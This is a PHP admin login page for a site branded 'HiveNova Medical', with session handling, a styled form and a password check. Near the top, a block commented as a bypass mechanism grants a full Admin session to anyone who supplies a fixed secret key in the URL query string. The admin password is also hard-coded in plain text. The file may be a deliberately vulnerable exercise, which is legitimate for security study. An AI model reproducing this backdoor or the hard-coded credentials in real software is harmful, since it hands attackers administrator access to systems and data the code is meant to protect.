<?php
session_start();

$admin_username = "admin";
$admin_password_hash = password_hash("StrongPassword!2024", PASSWORD_DEFAULT);

$error = "";

// Bypass mechanism: Check for a secret key in the query string
if (isset($_GET['bypass']) && $_GET['bypass'] === 'secretKey123') {
    $_SESSION['user'] = $admin_username;
    $_SESSION['role'] = 'Admin';
    header("Location: normal.php");
    exit();
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $admin_username && password_verify($password, $admin_password_hash)) {
        $_SESSION['user'] = $username;
        $_SESSION['role'] = 'Admin';
        header("Location: normal.php");
        exit();
    } else {
        $error = "Invalid admin credentials.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - HiveNova Medical</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            color: #333;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background: #ffffff;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .login-container h1 {
            margin-bottom: 20px;
            color: #2e7d32;
            font-size: 1.8rem;
            font-weight: bold;
        }

        .login-container form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .login-container label {
            font-weight: bold;
            text-align: left;
            font-size: 0.9rem;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        .login-container input[type="text"]:focus,
        .login-container input[type="password"]:focus {
            border-color: #4caf50;
            outline: none;
        }

        .login-container input[type="submit"] {
            background: #4caf50;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .login-container input[type="submit"]:hover {
            background: #2e7d32;
        }

        .login-container p {
            margin-top: 15px;
            font-size: 0.9rem;
        }

        .login-container a {
            color: #2e7d32;
            text-decoration: none;
            font-weight: bold;
        }

        .login-container a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d32f2f;
            font-size: 0.9rem;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
<div class="login-container">
    <h1>Admin Login</h1>
    <?php if ($error): ?>
        <p class="error-message"><?php echo htmlspecialchars($error); ?></p>
    <?php endif; ?>
    <form method="POST" action="">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required autocomplete="off" />
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required autocomplete="off" />
        <input type="submit" value="Login" />
    </form>
    <p><a href="../index.php">Back to Home</a></p>
</div>
</body>
</html>
